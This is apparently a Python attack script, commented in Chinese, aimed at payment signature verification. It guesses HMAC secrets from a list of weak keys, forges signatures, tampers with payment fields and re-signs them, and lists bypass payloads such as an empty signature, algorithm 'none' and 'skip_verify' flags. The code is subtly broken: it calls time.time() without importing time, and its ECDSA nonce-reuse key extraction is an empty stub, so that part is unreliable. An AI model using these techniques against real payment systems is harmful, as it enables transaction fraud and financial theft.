#!/usr/bin/env python3
"""签名破解与篡改"""
import hashlib
import hmac
import base64
import json
from typing import Dict, Optional, Tuple

class SignatureAttacker:
    """支付签名攻击"""

    def __init__(self):
        self.known_secrets = [
            "your_secret_key_here",
            "secret",
            "123456",
            "admin",
            "test",
            "development",
            "sk_test_",
            "sk_live_",
        ]

    def brute_force_hmac(self, data: str, signature: str, algorithm: str = "sha256") -> Optional[str]:
        """暴力破解 HMAC 密钥"""
        for secret in self.known_secrets:
            expected = hmac.new(
                secret.encode(),
                data.encode(),
                getattr(hashlib, algorithm)
            ).hexdigest()
            if hmac.compare_digest(expected, signature):
                return secret
        return None

    def generate_forge_signature(self, data: str, secret: str, algorithm: str = "sha256") -> str:
        """使用已知密钥伪造签名"""
        return hmac.new(
            secret.encode(),
            data.encode(),
            getattr(hashlib, algorithm)
        ).hexdigest()

    def tamper_and_sign(self, original_data: Dict, modifications: Dict, secret: str) -> Tuple[Dict, str]:
        """篡改数据并重新签名"""
        tampered = {**original_data, **modifications}
        payload = json.dumps(tampered, sort_keys=True, separators=(',', ':'))
        signature = self.generate_forge_signature(payload, secret)
        return tampered, signature

    def bypass_signature_check(self, data: Dict, signature: str) -> list:
        """尝试绕过签名验证"""
        bypass_methods = [
            lambda d, s: ({**d, "signature": ""}, ""),
            lambda d, s: ({**d, "algorithm": "none"}, ""),
            lambda d, s: ({**d, "timestamp": str(int(time.time()) + 3600)}, s),
            lambda d, s: ({**d, "_debug": True, "skip_verify": True}, s),
        ]
        return bypass_methods

class ECDSAVulnerability:
    """ECDSA 签名漏洞利用"""

    @staticmethod
    def extract_private_key(signatures: list = None) -> Optional[str]:
        """利用 nonce 重用提取私钥"""
        if not signatures or len(signatures) < 2:
            return None
        try:
            from ecdsa import NIST256p, SigningKey
            # ECDSA nonce 重用攻击实现
            pass
        except ImportError:
            pass
        return None
